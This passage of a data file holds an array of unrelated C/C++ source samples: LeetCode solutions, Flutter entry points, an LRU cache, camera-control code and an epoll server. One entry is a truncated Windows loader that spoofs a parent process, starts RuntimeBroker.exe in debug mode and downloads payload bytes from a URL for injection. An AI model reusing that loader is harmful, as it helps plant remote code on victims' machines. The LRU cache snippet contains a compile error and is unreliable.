PrimaryStart || i_p == PrimaryEnd) {\n                if (inside) return false;\n                else break;\n            }\n\n            if (set_combined.contains(i_p)) {\n                bool over = i_o;\n                bool primary = set_primary.contains(i_p);\n                LinkedCross* contactPoint = i_p;\n                if (inside) {\n                    if (lastOver != over && (lastPrimary == primary || over ^ primary ^ PrimaryUpper)) {\n                        return false;\n                    }\n                    LinkedChord lc(lastContactPoint, contactPoint, lastOver, over);\n                    chords.push_back(lc);\n                    inside = false;\n                }\n                else {\n                    lastOver = over;\n                    lastPrimary = primary;\n                    lastContactPoint = contactPoint;\n                    inside = true;\n                }\n            }\n        }\n    }\n    i_p = PrimaryStart;\n    i_o = PrimaryUpper;\n    {\n        bool inside = false;\n        bool lastOver;\n        bool lastPrimary;\n        LinkedCross* lastContactPoint = 0;\n        while (true) {\n            LinkedCross::TravelP(i_p, i_o);\n            if (i_p == PrimaryStart || i_p == PrimaryEnd) {\n                if (inside) return false;\n                else break;\n            }\n\n            if (set_combined.contains(i_p)) {\n                bool over = i_o;\n                bool primary = set_primary.contains(i_p);\n                LinkedCross* contactPoint = i_p;\n                if (inside) {\n                    if (lastOver != over && (lastPrimary == primary || over ^ primary ^ PrimaryUpper)) {\n                        return false;\n                    }\n                    LinkedChord lc(contactPoint, lastContactPoint, over, lastOver);\n                    chords.push_back(lc);\n                    inside = false;\n                }\n                else {\n                    lastOver = over;\n                    lastPrimary = primary;\n                    lastContactPoint = contactPoint;\n                    inside = true;\n                }\n            }\n        }\n    }\n    \n    //distributes points of chords into sets by type of chord,\n    //and returns false if a higher type crosses below a lower type\n\n    std::unordered_set<LinkedCross*> setU;\n\n    std::unordered_set<LinkedCross*> set1_L;\n    for (LinkedChord chord : chords) {\n        if (chord.over_start && ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"music_player\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"PowerShellExecutionResult.h\"\n#include <msclr/marshal.h>\n#include <string>\n\nusing namespace msclr::interop;\n\nPowerShellExecutionResult::PowerShellExecutionResult()\n    : _success(false), _output(nullptr), _errorMessage(nullptr)\n{\n}\n\nPowerShellExecutionResult::~PowerShellExecutionResult()\n{\n    this->!PowerShellExecutionResult();\n}\n\nPowerShellExecutionResult::!PowerShellExecutionResult()\n{\n    // Cleanup code, if any\n}\n\nvoid PowerShellExecutionResult::ToUnmanaged(PowerShellExecutionResultUnmanaged *result)\n{\n    if (result == nullptr)\n        throw gcnew ArgumentNullException(\"result\");\n\n    result->Success = _success;\n\n    if (_output != nullptr)\n    {\n        std::string outputStr = marshal_as<std::string>(_output);\n        result->Output = new char[outputStr.length() + 1];\n        strcpy_s(result->Output, outputStr.length() + 1, outputStr.c_str());\n    }\n    else\n    {\n        result->Output = nullptr;\n    }\n\n    if (_errorMessage != nullptr)\n    {\n        std::string errorStr = marshal_as<std::string>(_errorMessage);\n        result->ErrorMessage = new char[errorStr.length() + 1];\n        strcpy_s(result->ErrorMessage, errorStr.length() + 1, errorStr.c_str());\n    }\n    else\n    {\n        result->ErrorMessage = nullptr;\n    }\n}\n\nvoid PowerShellExecutionResult::FromUnmanaged(const PowerShellExecutionResultUnmanaged *result)\n{\n    if (result == nullptr)\n        throw gcnew ArgumentNullException(\"result\");\n\n    _success = result->Success;\n    _output = result->Output != nullptr ? gcnew String(result->Output) : nullptr;\n    _errorMessage = result->ErrorMessage != nullptr ? gcnew String(result->ErrorMessage) : nullptr;\n}",
    "#include <list>\n#include <unordered_map>\n#include <iostream>\nusing namespace std;\n\n\n//NODE TO STORE THE DATA (LINKED LIST)\nclass Node{\n\t public:\n\t \tstring key;\n\t \tint value;\n\t \t\n\t \tNode(string key,int value){\n\t \t\tthis->key = key;\n\t \t\tthis->value = value;\n\t\t }\n\t\n};\n\n\n\n//LRU CHACHE DATA STRUCTURE\nclass LRUCache{\n\tpublic:\n\t\tint maxSize;\n\t\tlist<Node> l;\n\t\tunordered_map<string,list<Node>::iterator> m;\n\t\t\n\t\tLRUCache(int maxSize){\n\t\t\tthis->maxSize = maxSize > 1 ? maxSize : 1 ;\n\t\t}\n\t\t\n\t\tvoid insertKeyValue(string key,int value){\n\t\t\t// 2 cases\n\t\t\t\n\t\t\tif(m.count(key)!=0){\n\t\t\t\t//UPDATE\n\t\t\t\tauto it = m(key);\n\t\t\t\tit->value = value;\n\t\t\t}  \n\t\t\telse {\n\t\t\t\t//CACHE IS FULL\n\t\t\t\t\n\t\t\t\t//REMOVE LRU ITEM\n\t\t\t\t\n\t\t\t\tif(l.size()==maxSize){\n\t\t\t\t\t\n\t\t\t\t\tNode last = l.back();\n\t\t\t\t\tm.erase(last.key);\n\t\t\t\t\tl.pop_back(); //remove from likedlist\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tNode n(key,value);\n\t\t\t\tl.push_front(n);\n\t\t\t\tm[key] = l.begin();\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t\t\n\t\tint* getValue(string key){\n\t\t\t\n\t\t\t//GET KEY FROM LRU\n\t\t\t\n\t\t\tif(m.count(key)!=0){\n\t\t\t\t\n\t\t\t\tauto it = m[key];\n\t\t\t\t\n\t\t\t\tint value = it->value;\n\t\t\t\tl.push_front(*it);\n\t\t\t\tl.erase(it);\n\t\t\t\tm[key] = l.begin();\n\t\t\t\treturn &l.begin()->value;\n\t\t\t}\n\t\t\t\n\t\t\treturn NULL;\n\t\t}\n\t\t\n\t\tstring mostRecentKey(){\n\t\t\t   \n\t\t\t   return l.front().key;\n\t\t}\n};\n\n\nint main(){\n\t\n\tLRUCache lru(3);\n\tlru.insertKeyValue(\"Mango\",10);\n\tlru.insertKeyValue(\"Banana\",20);\n\tlru.insertKeyValue(\"Apple\",30);\n\t\n\tcout<< lru.mostRecentKey()<<endl;\n\t\n\tlru.insertKeyValue(\"Mango\",40);\n\tcout<<lru.mostRecentKey()<<endl;\n\t\n\tlru.insertKeyValue(\"Pineapple\",20);\n\t\n\tif(lru.getValue(\"Apple\")==NULL){\n\t\t\n\t\tcout<<\"Apple doesn't exist\"<<endl;\n\t}\n\t\n\tif(lru.getValue(\"Guava\")==NULL){\n\t\t\n\t\tcout<<\"Guava doesn't exist\"<<endl;\n\t}\n\t\n\tif(lru.getValue(\"Banana\")==NULL){\n\t\t\n\t\tcout<<\"Banana doesn't exist\"<<endl;\n\t}\n\t\n\t\n\treturn 0;\n}\n",
    "/*\n27. Remove Element\nEasy\nTopics\nCompanies\nHint\nGiven an integer array nums and an integer val, remove all occurrences of val in nums in-place. The order of the elements may be changed. Then return the number of elements in nums which are not equal to val.\n\nConsider the number of elements in nums which are not equal to val be k, to get accepted, you need to do the following things:\n\nChange the array nums such that the first k elements of nums contain the elements which are not equal to val. The remaining elements of nums are not important as well as the size of nums.\nReturn k.\nCustom Judge:\n\nThe judge will test your solution with the following code:\n\nint[] nums = [...]; // Input array\nint val = ...; // Value to remove\nint[] expectedNums = [...]; // The expected answer with correct length.\n                            // It is sorted with no values equaling val.\n\nint k = removeElement(nums, val); // Calls your implementation\n\nassert k == expectedNums.length;\nsort(nums, 0, k); // Sort the first k elements of nums\nfor (int i = 0; i < actualLength; i++) {\n    assert nums[i] == expectedNums[i];\n}\nIf all assertions pass, then your solution will be accepted.\n\n \n\nExample 1:\n\nInput: nums = [3,2,2,3], val = 3\nOutput: 2, nums = [2,2,_,_]\nExplanation: Your function should return k = 2, with the first two elements of nums being 2.\nIt does not matter what you leave beyond the returned k (hence they are underscores).\nExample 2:\n\nInput: nums = [0,1,2,2,3,0,4,2], val = 2\nOutput: 5, nums = [0,1,4,0,3,_,_,_]\nExplanation: Your function should return k = 5, with the first five elements of nums containing 0, 0, 1, 3, and 4.\nNote that the five elements can be returned in any order.\nIt does not matter what you leave beyond the returned k (hence they are underscores).\n \n\nConstraints:\n\n0 <= nums.length <= 100\n0 <= nums[i] <= 50\n0 <= val <= 100\n*/\n\n\n//Code:\n\nclass Solution {\npublic:\n    int removeElement(vector<int>& nums, int val) {\n        int x{0};\n        for(int i = 0;i<nums.size();i++)\n        {\n            if (nums[i] != val)\n            {\n                nums[x] = nums[i];\n                ++x;\n\n            }\n        }\n        return x;\n    }\n};\n/*\n//basically identifiying and matching the array itmes from the given value and putting them in a separate array and also inreasing the count of the array\n\nAccepted\nRuntime: 0 ms\nCase 1\nCase 2\nInput\nnums =\n[3,2,2,3]\nval =\n3\nOutput\n[2,2]\nExpected\n[2,2]\n*/\n",
    "\ufeff#include \"camera.h\"\r\n#include<QDebug>\r\n#include<QThread>\r\n#include \"visor.h\"\r\n#include<QTime>\r\n\r\nQString idCamera[4] = {NULL};\r\nint32 idDevice[4] = {0};\r\nbool Camera::stopflag = false;\r\nbool Camera::NormalBrightness = true,Camera::AutoBrightness = false,Camera::setBrightness = false;\r\n\r\ninline const int my_dcamdev_string(DCAMERR& err,HDCAM hdcam,int32 idStr,char* text,int32 textbytes){\r\n    DCAMDEV_STRING param;\r\n    memset(&param,0,sizeof(param));\r\n    param.size = sizeof (param);\r\n    param.text = text;\r\n    param.textbytes = textbytes;\r\n    param.iString = idStr;\r\n\r\n    err = dcamdev_getstring(hdcam,&param);\r\n    return !failed(err);\r\n}\r\n\r\nvoid getCameraID(HDCAM hdcam,int i){\r\n    char cameraid[64];\r\n    DCAMERR err;\r\n    if(!my_dcamdev_string(err,hdcam,DCAM_IDSTR_CAMERAID,cameraid,sizeof(cameraid))){\r\n        PrintError(hdcam,err,\"dcamdev_getstring(DCAM_IDSTR_CAMERAID)\\n\");\r\n    }\r\n    idCamera[i] = cameraid;\r\n}\r\n\r\n//\u76f8\u673a\u521d\u59cb\u5316\r\nvoid dcamcon_init(){\r\n    DCAMAPI_INIT apiinit;\r\n    memset(&apiinit,0,sizeof(apiinit));\r\n    apiinit.size = sizeof(apiinit);\r\n    DCAMERR err = dcamapi_init(&apiinit);\r\n    if(failed(err)) {\r\n        PrintError(NULL,err,\"dcamapi_init()\");\r\n        return;\r\n    }\r\n    int32 nDevice = apiinit.iDeviceCount;\r\n    qDebug()<<\"Find Camera\"<<nDevice;\r\n    assert(nDevice>0);\r\n    for(int32 iDevice=0;iDevice<nDevice;iDevice++) {\r\n        idDevice[iDevice] = iDevice;\r\n        getCameraID((HDCAM)(intptr_t)iDevice,iDevice);\r\n    }\r\n}\r\n\r\n//\u6253\u5f00\u76f8\u673a\r\nHDCAM dcamcon_open(int32 iDevice){\r\n    DCAMDEV_OPEN devopen;\r\n    memset(&devopen,0,sizeof(devopen));\r\n    devopen.size = sizeof(devopen);\r\n    devopen.index = iDevice;\r\n    DCAMERR err = dcamdev_open(&devopen);\r\n    if(!failed(err)) {\r\n        HDCAM hdcam = devopen.hdcam;\r\n        qDebug()<<\"open\"<<(iDevice+1)<<\"camera\";\r\n        return hdcam;\r\n    }\r\n    PrintError((HDCAM)(intptr_t)iDevice,err,\"dcamdev_open()\",\"index is %d\\n\",iDevice);\r\n    return NULL;\r\n}\r\n\r\n//\u5728\u5173\u95ed\u7a97\u53e3\u4e4b\u540e\u8bb0\u5f97\u5173\u95ed\u76f8\u673a\u548c\u53bb\u521d\u59cb\u5316,   \u5728\u4e3b\u7ebf\u7a0b\u4e2dVISoR\u7c7b\u7684\u6790\u6784\u4e2d\u5b8c\u6210\r\n\r\n/**\u83b7\u5f97\u76f8\u673a\u76f8\u673a\u53e5\u67c4\u540e\uff0c\u521b\u5efa\u76f8\u673a\u7c7b\uff0c\u5b9e\u73b0\u76f8\u673a\u7684\u53c2\u6570\u8bbe\u7f6e\u3001\u62cd\u7167\u3001\u6570\u636e\u8bfb\u51fa***************************/\r\nCamera::Camera(QObject *parent)\r\n    : QObject{parent}\r\n{\r\n    pData8=new uchar[2304*2304*2];\r\n    liveTimer = new QTimer(this);\r\n    liveTimer->setTimerType(Qt::PreciseTimer);\r\n}\r\n\r\n//\u8bbe\u7f6e\u56fe\u50cf\u533a\u57df    \u56fe\u50cf\u957f\u5ea6\uff0c\u5bbd\u5ea6\uff0c\u5de6\u4e0a\u89d2\u9876\u70b9\u7684\u4f4d\u7f6e\u4fe1\u606f   \u8bbe\u7f6e\u6210\u529f\u8fd4\u56detrue\uff0c\u5931\u8d25\u8fd4\u56defalse\r\nbool Camera::set_ROI()\r\n{\r\n    err = dcamprop_setvalue(m_hdcam,DCAM_IDPROP_SUBARRAYMODE,DCAMPROP_MODE__OFF);\r\n    if(failed(err))\r\n    {\r\n        PrintError(m_hdcam,err,\"set_SUBARRAYMODE__OFF\");\r\n        return false;\r\n    }\r\n    err = dcamprop_setvalue(m_hdcam,DCAM_IDPROP_SUBARRAYHSIZE,camInfo.Width);\r\n    if(failed(err))\r\n    {\r\n        PrintError(m_hdcam,err,\"set_SUBARRAYHSIZE\");\r\n        return false;\r\n    }\r\n    err = dcamprop_setvalue(m_hdcam,DCAM_IDPROP_SUBARRAYVSIZE,camInfo.Height);\r\n    if(failed(err))\r\n    {\r\n        PrintError(m_hdcam,err,\"set_SUBARRAYVSIZE\");\r\n        return false;\r\n    }\r\n    err = dcamprop_setvalue(m_hdcam,DCAM_IDPROP_SUBARRAYHPOS,0);\r\n    if(failed(err))\r\n    {\r\n        PrintError(m_hdcam,err,\"set_SUBARRAYHPOS\");\r\n        return false;\r\n    }\r\n    err = dcamprop_setvalue(m_hdcam,DCAM_IDPROP_SUBARRAYVPOS,(2304-camInfo.Height)/2);\r\n    if(failed(err))\r\n    {\r\n        PrintError(m_hdcam,err,\"set_SUBARRAYVPOS\");\r\n        return false;\r\n    }\r\n//    err = dcamprop_setvalue(m_hdcam,DCAM_IDPROP_SUBARRAYVPOS,300);\r\n//    if(failed(err))\r\n//    {\r\n//        PrintError(m_hdcam,err,\"set_SUBARRAYVPOS\");\r\n//        return false;\r\n//    }\r\n    err = dcamprop_setvalue(m_hdcam,DCAM_IDPROP_SUBARRAYMODE,DCAMPROP_MODE__ON);\r\n    if(failed(err))\r\n    {\r\n        PrintError(m_hdcam,err,\"set_SUBARRAYMODE__ON\");\r\n        return false;\r\n    }\r\n    return true;\r\n}\r\n\r\n//\u8bbe\u7f6e\u76f8\u673a\u53c2\u6570\uff08ORCA-Fusion,Hamamatsu\uff09 \u5916\u89e6\u53d1\uff0c\u4ea7\u751fTIMESTAMP\u6e90\uff0c\u8bfb\u53d6\u901f\u5ea6\r\nbool Camera::setValue()\r\n{\r\n    if(failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_TRIGGERSOURCE,DCAMPROP_TRIGGERSOURCE__EXTERNAL))\r\n     //||failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_TRIGGERACTIVE,DCAMPROP_TRIGGERACTIVE__EDGE))\r\n     ||failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_TRIGGERACTIVE,DCAMPROP_TRIGGERACTIVE__SYNCREADOUT))\r\n     ||failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_TRIGGERPOLARITY,DCAMPROP_TRIGGERPOLARITY__POSITIVE))\r\n     //||failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_TRIGGER_GLOBALEXPOSURE,DCAMPROP_TRIGGER_GLOBALEXPOSURE__GLOBALRESET)) //\u8bbe\u7f6eglobal rolling\r\n     ||failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_TIMESTAMP_PRODUCER,DCAMPROP_TIMESTAMP_PRODUCER__IMAGINGDEVICE))\r\n     ||failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_READOUTSPEED,DCAMPROP_READOUTSPEED__FASTEST))\r\n     //||failed(dcamprop_setvalue(m_hdcam,DCAM_IDPROP_EXPOSURETIME,camInfo.exposure/1000))\r\n     ){\r\n        qWarning()<<\"Unable to connect to camera\";\r\n        return false;\r\n    }\r\n    return true;\r\n}\r\n\r\n//\u8bbe\u7f6eHDCAMWAIT handle\u3001Waiting EVENT\u3001Acquisition buffer\r\nbool Camera::prepareCapture()\r\n{\r\n    //dcamprop_setvalue(m_hdcam,DCAM_IDPROP_EXPOSURETIME,0.1);\r\n    //The HDCAMWAIT handle is prepared for the dcamwait functions\r\n    memset(&m_waitopen,0",
    "#include <windows.h>\n#include <wininet.h>\n#include <stdio.h>\n#include <tlhelp32.h>\n\n#pragma comment (lib, \"Wininet.lib\")\n\nBOOL GetRemoteProcessHandle(IN DWORD dwProcessId, OUT HANDLE* hProcess) {\n\tPROCESSENTRY32 Proc = {};\n\tProc.dwSize = sizeof(PROCESSENTRY32);\n\n\n\tHANDLE hSnapShot = NULL;\n\n\thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n\tif (hSnapShot == INVALID_HANDLE_VALUE) {\n\t\twprintf(L\"[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\", GetLastError());\n\t\tgoto _EndOfFunction;\n\t}\n\n\tif (!Process32First(hSnapShot, &Proc)) {\n\t\twprintf(L\"[!] Process32First Failed With Error : %d \\n\", GetLastError());\n\t\tgoto _EndOfFunction;\n\t}\n\n\tdo {\n\t\tif (Proc.th32ProcessID == dwProcessId) {\n\t\t\t*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);\n\t\t\tif (*hProcess == NULL)\n\t\t\t\twprintf(L\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError());\n\n\t\t\tbreak;\n\t\t}\n\n\t} while (Process32Next(hSnapShot, &Proc));\n\n_EndOfFunction:\n\tif (hSnapShot != NULL)\n\t\tCloseHandle(hSnapShot);\n\tif (*hProcess == INVALID_HANDLE_VALUE)\n\t\treturn FALSE;\n\treturn TRUE;\n}\n\nBOOL CreateDebugProcess(IN const char* lpProcessName, IN HANDLE hParentProcess, OUT DWORD* dwProcessID, OUT HANDLE* hProcess, OUT HANDLE* hThread) {\n    \n    CHAR lpPath[MAX_PATH * 2] = \"C:\\\\WINDOWS\\\\System32\\\\RuntimeBroker.exe\";\n\tCHAR CurrentDir[MAX_PATH];\n\tCHAR WnDr[MAX_PATH];\n\n\tSIZE_T                             sThreadAttList = NULL;\n\tPPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;\n\n    STARTUPINFOEXA SIEx;\n    PROCESS_INFORMATION PI;\n\n\tZeroMemoryEx(&SIEx, sizeof(STARTUPINFOEXA));\n\tZeroMemoryEx(&PI, sizeof(PROCESS_INFORMATION));\n\n\tSIEx.StartupInfo.cb = sizeof(STARTUPINFO);\n\n    if (!GetEnvironmentVariableA(\"WINDIR\", WnDr, MAX_PATH)) {\n\t\tprintf(\"[!] GetEnvironmentVariableA Failed With Error : %d \\n\", GetLastError());\n        return FALSE;\n    }\n\n\tInitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);\n\n\tpThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);\n\tif (pThreadAttList == NULL) {\n\t\tprintf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError());\n\t\treturn FALSE;\n\t}\n\n\tif (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {\n\t\tprintf(\"[!] InitializeProcThreadAttributeList Failed With Error : %d \\n\", GetLastError());\n\t\treturn FALSE;\n\t}\n\n\tif (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {\n\t\tprintf(\"[!] UpdateProcThreadAttribute Failed With Error : %d \\n\", GetLastError());\n\t\treturn FALSE;\n\t}\n\n\tSIEx.lpAttributeList = pThreadAttList;\n\t\n    //sprintf(lpPath, \"%s\\\\System32\\\\%s\", WnDr, lpProcessName);\n\t\n\tchar n_lpPath[MAX_PATH];\n\n\tprintf(\"\\n[i] Running : \\\"%s\\\" ... \\n\", lpPath);\n\n\n    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | DEBUG_PROCESS, NULL, NULL, &SIEx.StartupInfo, &PI)) {\n\t\tprintf(\"[!] CreateProcess with Error : %d\\n\", GetLastError());\n        return FALSE;\n    };\n\n    *dwProcessID = PI.dwProcessId;\n    *hProcess = PI.hProcess;\n    *hThread = PI.hThread;\n    \n\tDeleteProcThreadAttributeList(pThreadAttList);\n\tCloseHandle(hParentProcess);\n\n    if (*dwProcessID != NULL && *hProcess != NULL && *hThread != NULL)\n        return TRUE;\n \n    return FALSE;\n}\n\nBOOL GetBytesFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {\n\n\tBOOL\t\tbSTATE = TRUE;\n\n\tHINTERNET\thInternet = NULL,\n\t\thInternetFile = NULL;\n\n\tDWORD\t\tdwBytesRead = NULL;\n\n\tSIZE_T\t\tsSize = NULL;\n\tPBYTE\t\tpBytes = NULL,\n\t\tpTmpBytes = NULL;\n\n\n\thInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);\n\tif (hInternet == NULL) {\n\t\tprintf(\"[!] InternetOpenW Failed With Error : %d \\n\", GetLastError());\n\t\tbSTATE = FALSE; goto _EndOfFunction;\n\t}\n\n\thInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);\n\tif (hInternetFile == NULL) {\n\t\tprintf(\"[!] InternetOpenUrlW Failed With Error : %d \\n\", GetLastError());\n\t\tbSTATE = FALSE; goto _EndOfFunction;\n\t}\n\n\n\tpTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);\n\tif (pTmpBytes == NULL) {\n\t\tbSTATE = FALSE; goto _EndOfFunction;\n\t}\n\n\twhile (TRUE) {\n\t\t\n\t\tif (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {\n\t\t\tprintf(\"[!] InternetReadFile Failed With Error : %d \\n\", GetLastError());\n\t\t\tbSTATE = FALSE; goto _EndOfFunction;\n\t\t}\n\n\t\tsSize += dwBytesRead;\n\n\t\tif (pBytes == NULL)\n\t\t\tpBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);\n\t\telse\n\t\t\tpBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);\n\n\t\tif (pBytes == NULL) {\n\t\t\tbSTATE = FALSE; goto _EndOfFunction;\n\t\t}\n\t\tmemcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);\n\t\tmemset(pTmpBytes, '\\0', dwBytesRead);\n\n\t\tif (dwBytesRead < 1024) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\n\n\t*pPayloadBytes = pBytes;\n\t*sPayloadSize = sSize;\n\n_EndOfFunction:\n\tif (hInternet)\n\t\tInternetCloseHandle(hInternet);\n\tif (hInternetFile)\n\t\tInternetCloseHandle(hInternetFile);\n\tif (hInternet)\n\t\tInternetSetOpt",
    "#include <iostream>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <arpa/inet.h>\n#include <sys/fcntl.h>\n#include <sys/epoll.h>\nusing namespace std;\n\n\nint initserver(int port);\n\nint main(int argc,char *argv[])\n{\n    if(argc != 2)\n    {\n        perror(\"failed\");\n        return -1;\n\n    }\n    int listenfd = initserver(atoi(argv[1]));\n    if(listenfd < 0)\n    {\n        perror(\"failed\");\n        return -1;\n    }\n    cout << \"listenfd is \" << listenfd << endl;\n\n    // \u521b\u5efaepoll\u53e5\u67c4\u3002\n    int epollfd=epoll_create(1);\n\n    epoll_event ev;         //\u58f0\u660e\u4e8b\u4ef6\u7684\u6570\u636e\u7ed3\u6784\n    ev.data.fd = listenfd;\n    ev.events = EPOLLIN;    //\u6253\u7b97\u8ba9epoll\u76d1\u89c6listensock\u7684\u8bfb\u4e8b\u4ef6\n\n    epoll_ctl(epollfd, EPOLL_CTL_ADD, listenfd, &ev);  //\u628a\u9700\u8981\u76d1\u89c6\u7684socket\u548c\u4e8b\u4ef6\u52a0\u5165epollfd\u4e2d\n\n    epoll_event evs[10];\n\n    while (1)\n    {\n        int infds = epoll_wait(epollfd, evs, 10, -1);\n\n        if(infds < 0)\n        {\n            perror(\"epoll() faild\");\n            break;\n        }\n        if(infds == 0)\n        {\n            perror(\"epoll() timeout\");\n            continue;\n        }\n\n        for(int i = 0; i < infds; i++)\n        {\n            if(evs[i].data.fd == listenfd)\n            {\n                struct sockaddr_in clientaddr;\n                socklen_t len = sizeof(clientaddr);\n                int clientfd = accept(listenfd, (struct sockaddr*)&clientaddr, &len);\n                if(clientfd < 0)\n                {\n                    perror(\"accept() failed\");\n                    continue;\n                }\n                ev.data.fd = clientfd;\n                ev.events = EPOLLIN;\n                epoll_ctl(epollfd, EPOLL_CTL_ADD, clientfd, &ev);   \n            }\n            else\n            {\n                char buffer[1024];\n                memset(buffer, 0, sizeof(buffer));\n                if(recv(evs[i].data.fd, buffer, sizeof(buffer), 0) <= 0)\n                {\n                    cout << \"disconnect\" << evs[i].data.fd << endl;\n                    close(evs[i].data.fd);\n                    //epoll_ctl(epollfd, EPOLL_CTL_DEL, evs[i].data.fd, 0);\n                }\n                else\n                {\n                    cout << \"recv:\" << buffer << endl;\n                    send(evs[i].data.fd, buffer, strlen(buffer), 0);\n                }\n\n            }\n        }\n\n    }\n    return 0;\n\n}\n\nint initserver(int port)\n{\n    int sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    if (sockfd < 0)\n    {\n        perror(\"create socket failed\");\n        return -1;\n    }\n    int on = 1;\n    unsigned int len = sizeof(on);\n    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &on, len);\n    struct sockaddr_in servaddr;\n    servaddr.sin_family = AF_INET;\n    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n    servaddr.sin_port = htons(port);\n\n    if(bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0)\n    {\n        perror(\"bind() failed\");\n        close(sockfd);\n        return -1;\n    }\n    if(listen(sockfd, 5) != 0)\n    {\n        perror(\"listen failed\");\n        close(sockfd);\n        return -1;\n    }\n    return sockfd;\n}",
    "class Solution {\npublic:\n    string reverseParentheses(string s) {\n        int count = 0;\n        for(int i=0; i<s.size(); i++){\n            if(s[i] ==')' || s[i] == '(') count++;\n        }\n        \n        stack<char> st;\n        string ans;\n\n       for(int i=0 ; i<s.size(); i++){\n         if(s[i] == ')'){\n            string sb;\n            while(st.top() != '('){\n                sb.push_back(st.top());\n                st.pop();\n            }\n            st.pop();\n           // if(count == 0) \n\n            if(st.empty() && i == s.size() - 1) ans = sb;\n            else{\n                for(int j=0; j<sb.size(); j++){\n                   st.push(sb[j]);\n                }\n            }\n         }else{\n            st.push(s[i]);\n         }\n       }\n       if(st.size() == 0) return ans;\n       else{\n        ans = \"\";\n         while(!st.empty()){\n             ans.push_back(st.top());\n             st.pop();\n             }\n       }\n       reverse(ans.begin(), ans.end());\n      return ans;\n    }\n};",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hubtel_coding_challenge_repo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
